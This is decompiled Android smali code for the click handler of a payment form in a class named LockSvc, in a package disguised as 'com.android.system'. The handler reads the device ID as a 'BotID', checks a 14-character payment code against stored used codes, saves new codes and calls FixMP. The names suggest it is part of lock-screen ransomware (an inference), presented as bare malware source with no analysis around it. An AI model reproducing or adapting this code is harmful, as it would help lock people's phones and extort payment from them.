.class Lcom/android/system/LockSvc$5;
.super Ljava/lang/Object;
.source "LockSvc.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/android/system/LockSvc;->MP_Pay(Landroid/view/View;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/system/LockSvc;

.field private final synthetic val$Code:Landroid/widget/TextView;

.field private final synthetic val$ConList:Landroid/widget/ListView;

.field private final synthetic val$Error:Landroid/widget/LinearLayout;

.field private final synthetic val$Loaded:Landroid/widget/LinearLayout;

.field private final synthetic val$PayForm:Landroid/widget/LinearLayout;

.field private final synthetic val$UsedCode:Landroid/widget/LinearLayout;

.field private final synthetic val$payForm2:Landroid/view/View;


# direct methods
.method constructor <init>(Lcom/android/system/LockSvc;Landroid/widget/ListView;Landroid/view/View;Landroid/widget/LinearLayout;Landroid/widget/LinearLayout;Landroid/widget/LinearLayout;Landroid/widget/TextView;Landroid/widget/LinearLayout;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/android/system/LockSvc$5;->this$0:Lcom/android/system/LockSvc;

    iput-object p2, p0, Lcom/android/system/LockSvc$5;->val$ConList:Landroid/widget/ListView;

    iput-object p3, p0, Lcom/android/system/LockSvc$5;->val$payForm2:Landroid/view/View;

    iput-object p4, p0, Lcom/android/system/LockSvc$5;->val$Loaded:Landroid/widget/LinearLayout;

    iput-object p5, p0, Lcom/android/system/LockSvc$5;->val$Error:Landroid/widget/LinearLayout;

    iput-object p6, p0, Lcom/android/system/LockSvc$5;->val$UsedCode:Landroid/widget/LinearLayout;

    iput-object p7, p0, Lcom/android/system/LockSvc$5;->val$Code:Landroid/widget/TextView;

    iput-object p8, p0, Lcom/android/system/LockSvc$5;->val$PayForm:Landroid/widget/LinearLayout;

    .line 366
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private CheckCode(Ljava/lang/String;)Z
    .locals 5
    .param p1, "string"    # Ljava/lang/String;

    .prologue
    .line 470
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "cache"

    iget-object v4, p0, Lcom/android/system/LockSvc$5;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v4}, Lcom/android/system/LockSvc;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    .line 471
    .local v1, "Codes":Ljava/lang/String;
    invoke-virtual {v1, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_0

    const/4 v0, 0x1

    .line 472
    .local v0, "Code":Z
    :goto_0
    return v0

    .line 471
    .end local v0    # "Code":Z
    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method private addNewCode(Ljava/lang/String;)V
    .locals 5
    .param p1, "string"    # Ljava/lang/String;

    .prologue
    .line 461
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "cache"

    iget-object v4, p0, Lcom/android/system/LockSvc$5;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v4}, Lcom/android/system/LockSvc;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "!"

    const-string v4, ""

    invoke-virtual {v2, v3, v4}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 462
    .local v0, "Codes":Ljava/lang/String;
    const-string v1, ""

    .line 463
    .local v1, "Tmp":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 465
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "cache"

    iget-object v4, p0, Lcom/android/system/LockSvc$5;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v4}, Lcom/android/system/LockSvc;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {v2, v3, v1, v4}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 466
    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 13
    .param p1, "arg0"    # Landroid/view/View;

    .prologue
    .line 370
    const/4 v4, 0x0

    .line 373
    .local v4, "Busy":Z
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$ConList:Landroid/widget/ListView;

    invoke-virtual {v8}, Landroid/widget/ListView;->clearFocus()V

    .line 375
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->this$0:Lcom/android/system/LockSvc;

    const-string v9, "phone"

    invoke-virtual {v8, v9}, Lcom/android/system/LockSvc;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/telephony/TelephonyManager;

    .line 377
    .local v7, "Tm":Landroid/telephony/TelephonyManager;
    invoke-virtual {v7}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v8

    if-eqz v8, :cond_8

    .line 378
    invoke-virtual {v7}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v3

    .line 381
    .local v3, "BotID":Ljava/lang/String;
    :goto_0
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$payForm2:Landroid/view/View;

    .line 382
    iget-object v9, p0, Lcom/android/system/LockSvc$5;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v9}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v9

    const-string v10, "reseted"

    const-string v11, "id"

    iget-object v12, p0, Lcom/android/system/LockSvc$5;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v12}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v9, v10, v11, v12}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v9

    invoke-virtual {v8, v9}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v6

    .line 381
    check-cast v6, Landroid/widget/LinearLayout;

    .line 385
    .local v6, "Error2":Landroid/widget/LinearLayout;
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$Loaded:Landroid/widget/LinearLayout;

    invoke-virtual {v8}, Landroid/widget/LinearLayout;->getVisibility()I

    move-result v8

    if-nez v8, :cond_9

    const/4 v0, 0x1

    .line 386
    .local v0, "A1":Z
    :goto_1
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$Error:Landroid/widget/LinearLayout;

    invoke-virtual {v8}, Landroid/widget/LinearLayout;->getVisibility()I

    move-result v8

    if-nez v8, :cond_a

    const/4 v1, 0x1

    .line 387
    .local v1, "A2":Z
    :goto_2
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$UsedCode:Landroid/widget/LinearLayout;

    invoke-virtual {v8}, Landroid/widget/LinearLayout;->getVisibility()I

    move-result v8

    if-nez v8, :cond_b

    const/4 v2, 0x1

    .line 388
    .local v2, "A3":Z
    :goto_3
    invoke-virtual {v6}, Landroid/widget/LinearLayout;->getVisibility()I

    move-result v8

    if-nez v8, :cond_c

    const/4 v5, 0x1

    .line 394
    .local v5, "Err2":Z
    :goto_4
    if-eqz v0, :cond_0

    .line 396
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$Loaded:Landroid/widget/LinearLayout;

    const/16 v9, 0x8

    invoke-virtual {v8, v9}, Landroid/widget/LinearLayout;->setVisibility(I)V

    .line 399
    :cond_0
    if-eqz v1, :cond_1

    .line 402
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$Error:Landroid/widget/LinearLayout;

    const/16 v9, 0x8

    invoke-virtual {v8, v9}, Landroid/widget/LinearLayout;->setVisibility(I)V

    .line 405
    :cond_1
    if-eqz v2, :cond_2

    .line 407
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$UsedCode:Landroid/widget/LinearLayout;

    const/16 v9, 0x8

    invoke-virtual {v8, v9}, Landroid/widget/LinearLayout;->setVisibility(I)V

    .line 414
    :cond_2
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$Code:Landroid/widget/TextView;

    invoke-virtual {v8}, Landroid/widget/TextView;->length()I

    move-result v8

    if-eqz v8, :cond_3

    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$Code:Landroid/widget/TextView;

    invoke-virtual {v8}, Landroid/widget/TextView;->length()I

    move-result v8

    const/16 v9, 0xe

    if-lt v8, v9, :cond_3

    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$Code:Landroid/widget/TextView;

    invoke-virtual {v8}, Landroid/widget/TextView;->length()I

    move-result v8

    const/16 v9, 0xe

    if-gt v8, v9, :cond_3

    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$Code:Landroid/widget/TextView;

    invoke-virtual {v8}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v8

    invoke-interface {v8}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v3, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v8

    if-eqz v8, :cond_4

    .line 415
    :cond_3
    if-nez v4, :cond_4

    .line 417
    const/4 v4, 0x1

    .line 418
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$Error:Landroid/widget/LinearLayout;

    const/4 v9, 0x0

    invoke-virtual {v8, v9}, Landroid/widget/LinearLayout;->setVisibility(I)V

    .line 425
    :cond_4
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$Code:Landroid/widget/TextView;

    invoke-virtual {v8}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v8

    invoke-interface {v8}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-direct {p0, v8}, Lcom/android/system/LockSvc$5;->CheckCode(Ljava/lang/String;)Z

    move-result v8

    if-eqz v8, :cond_5

    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$Code:Landroid/widget/TextView;

    invoke-virtual {v8}, Landroid/widget/TextView;->length()I

    move-result v8

    if-lez v8, :cond_5

    if-nez v4, :cond_5

    .line 428
    const/4 v4, 0x1

    .line 432
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$UsedCode:Landroid/widget/LinearLayout;

    const/4 v9, 0x0

    invoke-virtual {v8, v9}, Landroid/widget/LinearLayout;->setVisibility(I)V

    .line 435
    :cond_5
    if-nez v4, :cond_7

    .line 437
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$Code:Landroid/widget/TextView;

    invoke-virtual {v8}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v8

    invoke-interface {v8}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-direct {p0, v8}, Lcom/android/system/LockSvc$5;->addNewCode(Ljava/lang/String;)V

    .line 439
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$PayForm:Landroid/widget/LinearLayout;

    const/16 v9, 0x8

    invoke-virtual {v8, v9}, Landroid/widget/LinearLayout;->setVisibility(I)V

    .line 442
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$Loaded:Landroid/widget/LinearLayout;

    const/4 v9, 0x0

    invoke-virtual {v8, v9}, Landroid/widget/LinearLayout;->setVisibility(I)V

    .line 444
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->val$PayForm:Landroid/widget/LinearLayout;

    const/16 v9, 0x8

    invoke-virtual {v8, v9}, Landroid/widget/LinearLayout;->setVisibility(I)V

    .line 446
    if-eqz v5, :cond_6

    .line 448
    const/16 v8, 0x8

    invoke-virtual {v6, v8}, Landroid/widget/LinearLayout;->setVisibility(I)V

    .line 452
    :cond_6
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->this$0:Lcom/android/system/LockSvc;

    iget-object v9, p0, Lcom/android/system/LockSvc$5;->val$Code:Landroid/widget/TextView;

    invoke-virtual {v9}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v9

    invoke-interface {v9}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Lcom/android/system/LockSvc;->FixMP(Ljava/lang/String;)V

    .line 458
    :cond_7
    return-void

    .line 378
    .end local v0    # "A1":Z
    .end local v1    # "A2":Z
    .end local v2    # "A3":Z
    .end local v3    # "BotID":Ljava/lang/String;
    .end local v5    # "Err2":Z
    .end local v6    # "Error2":Landroid/widget/LinearLayout;
    :cond_8
    iget-object v8, p0, Lcom/android/system/LockSvc$5;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v8}, Lcom/android/system/LockSvc;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    invoke-virtual {v8}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v8

    const-string v9, "android_id"

    invoke-static {v8, v9}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    goto/16 :goto_0

    .line 385
    .restart local v3    # "BotID":Ljava/lang/String;
    .restart local v6    # "Error2":Landroid/widget/LinearLayout;
    :cond_9
    const/4 v0, 0x0

    goto/16 :goto_1

    .line 386
    .restart local v0    # "A1":Z
    :cond_a
    const/4 v1, 0x0

    goto/16 :goto_2

    .line 387
    .restart local v1    # "A2":Z
    :cond_b
    const/4 v2, 0x0

    goto/16 :goto_3

    .line 388
    .restart local v2    # "A3":Z
    :cond_c
    const/4 v5, 0x0

    goto/16 :goto_4
.end method
